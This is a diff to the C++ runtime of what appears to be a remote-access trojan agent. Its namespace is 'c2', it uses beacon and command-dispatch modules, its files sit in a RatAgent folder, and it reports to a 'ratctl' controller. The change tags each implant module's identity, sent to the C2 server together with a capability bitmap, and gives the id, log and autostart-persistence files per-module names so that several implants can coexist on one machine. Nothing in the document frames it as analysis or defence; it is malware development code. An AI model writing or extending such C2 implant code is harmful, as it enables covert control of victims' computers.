@@ -1,6 +1,7 @@
 // agent_runtime.cpp — Agent 运行核心实现（EXE 与 DLL 共用）
 #include "agent_runtime.h"
 #include "agent_debug.h"
+#include "module_id.h"
 
 #include "beacon.h"
 #include "cmd_dispatch.h"
@@ -184,7 +185,10 @@ namespace c2
                 cfg.psk[i] = (uint8_t)strtol(b, nullptr, 16);
             }
             std::memcpy(cfg.agent_id, agent_id, kAgentIdLen);
-            cfg.os_info = "Windows";
+            // 模块标签：让 C2 侧一眼看出"这台机器的哪个模块"（服务端存入 OSInfo 并打印）
+            cfg.os_info = std::string("Windows (") + kModuleId + ")";
+            // 能力位：走已有的 plugins 位图链路（HELLO/心跳 → 服务端 → ratctl）
+            cfg.plugins_bitmap = kModuleCaps;
             return cfg;
         }
 
@@ -456,14 +460,15 @@ namespace c2
 
     std::string agent_default_id_path(bool for_dll)
     {
+        // 文件名带模块前缀：同机多模块共存时身份互不覆盖（见 module_id.h）
         if (!for_dll)
-            return "agent.id"; // EXE：保持历史行为（相对 CWD）
-        return wide_to_utf8(agent_dir_wide()) + "\\agent.id";
+            return std::string(kModuleId) + ".id"; // EXE：相对 CWD（保留历史行为）
+        return wide_to_utf8(agent_dir_wide()) + "\\" + kModuleId + ".id";
     }
 
     std::string agent_default_log_path()
     {
-        return wide_to_utf8(agent_dir_wide()) + "\\agent.log";
+        return wide_to_utf8(agent_dir_wide()) + "\\" + kModuleId + ".log";
     }
 
     bool agent_redirect_stdout(const std::string& path)
@@ -625,7 +630,8 @@ namespace c2
 
     std::string agent_autostart_path()
     {
-        return wide_to_utf8(agent_dir_wide()) + "\\autostart.args";
+        // 文件名带模块前缀：避免同机多模块互相误触发自启（见 module_id.h）
+        return wide_to_utf8(agent_dir_wide()) + "\\" + kModuleId + ".autostart.args";
     }
 
     namespace
@@ -654,7 +660,8 @@ namespace c2
 
     bool agent_autostart_requested(std::string& args)
     {
-        // 依次探测：LOCALAPPDATA\RatAgent\autostart.args → %TEMP%\RatAgent\autostart.args
+        // 依次探测：LOCALAPPDATA\RatAgent\<module>.autostart.args →
+        //           %TEMP%\RatAgent\<module>.autostart.args
         std::vector<std::string> cands;
         cands.push_back(agent_autostart_path());
         std::wstring tmp = env_wide(L"TEMP");
@@ -662,7 +669,9 @@ namespace c2
         {
             if (tmp[tmp.size() - 1] != L'\\')
                 tmp += L'\\';
-            tmp += L"RatAgent\\autostart.args";
+            tmp += L"RatAgent\\";
+            tmp += utf8_to_wide(kModuleId);
+            tmp += L".autostart.args";
             cands.push_back(wide_to_utf8(tmp));
         }
         for (const auto& c : cands)
